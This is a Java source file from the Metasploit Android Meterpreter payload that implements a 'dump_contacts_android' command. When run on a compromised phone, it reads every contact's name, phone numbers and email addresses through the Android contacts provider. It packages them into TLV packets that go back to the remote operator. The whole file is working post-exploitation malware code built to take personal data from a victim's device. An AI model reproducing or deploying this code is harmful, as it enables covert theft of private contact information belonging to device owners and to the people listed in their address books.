package com.metasploit.meterpreter.android;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

public class dump_contacts_android implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_CONTACT_GROUP = TLVPacket.TLV_META_TYPE_GROUP
            | (TLV_EXTENSIONS + 9007);
    private static final int TLV_TYPE_CONTACT_NUMBER = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9008);
    private static final int TLV_TYPE_CONTACT_EMAIL = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9009);
    private static final int TLV_TYPE_CONTACT_NAME = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9010);

    private static final String classNameContacts = "android.provider.ContactsContract$Contacts";
    private static final String classNameData = "android.provider.ContactsContract$Data";
    private static final String classNameEmail = "android.provider.ContactsContract$CommonDataKinds$Email";
    private static final String contentUri = "CONTENT_URI";
    private static final String _id = "_id";
    private static final String displayName = "display_name";
    private static final String contactId = "contact_id";
    private static final String data1 = "data1";

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request,
                       TLVPacket response) throws Exception {

        ContentResolver cr = AndroidMeterpreter.getContext()
                .getContentResolver();

        if (Integer.parseInt(Build.VERSION.RELEASE.substring(0, 1)) >= 2) {

            Uri ContactUri = null, PhoneUri = null, EmailUri = null;
            Class<?> c = Class.forName(classNameContacts);
            ContactUri = (Uri) c.getField(contentUri).get(ContactUri);
            Cursor cur = cr.query(ContactUri, null, null, null, null);

            if (cur.getCount() > 0) {

                while (cur.moveToNext()) {

                    TLVPacket pckt = new TLVPacket();

                    String id = cur.getString(cur.getColumnIndex(_id));

                    pckt.addOverflow(TLV_TYPE_CONTACT_NAME,
                            cur.getString(cur.getColumnIndex(displayName)));

                    c = Class.forName(classNameData);
                    PhoneUri = (Uri) c.getField(contentUri).get(PhoneUri);
                    Cursor pCur = cr.query(PhoneUri, null, contactId + " = ?",
                            new String[]{id}, null);

                    while (pCur.moveToNext()) {
                        pckt.addOverflow(TLV_TYPE_CONTACT_NUMBER,
                                pCur.getString(pCur.getColumnIndex(data1)));
                    }
                    pCur.close();

                    c = Class.forName(classNameEmail);
                    EmailUri = (Uri) c.getField(contentUri).get(EmailUri);
                    Cursor emailCur = cr.query(EmailUri, null, contactId
                            + " = ?", new String[]{id}, null);

                    while (emailCur.moveToNext()) {
                        pckt.addOverflow(TLV_TYPE_CONTACT_EMAIL, emailCur
                                .getString(emailCur.getColumnIndex(data1)));
                    }
                    emailCur.close();

                    response.addOverflow(TLV_TYPE_CONTACT_GROUP, pckt);

                }
            }

            cur.close();
        }

        return ERROR_SUCCESS;
    }

}
